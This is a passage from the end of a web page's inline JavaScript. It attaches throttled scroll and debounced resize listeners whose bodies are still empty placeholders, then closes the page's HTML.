        const handleScroll = throttle(() => {
            // Add any scroll-based logic here if needed
            // Currently empty but ready for future enhancements
        }, 100);

        window.addEventListener('scroll', handleScroll, { passive: true });

        // Optimize resize events if any
        const handleResize = debounce(() => {
            // Add any resize-based logic here if needed
            // Currently empty but ready for future enhancements
        }, 150);

        window.addEventListener('resize', handleResize, { passive: true });
    });
</script>

</body>
</html>
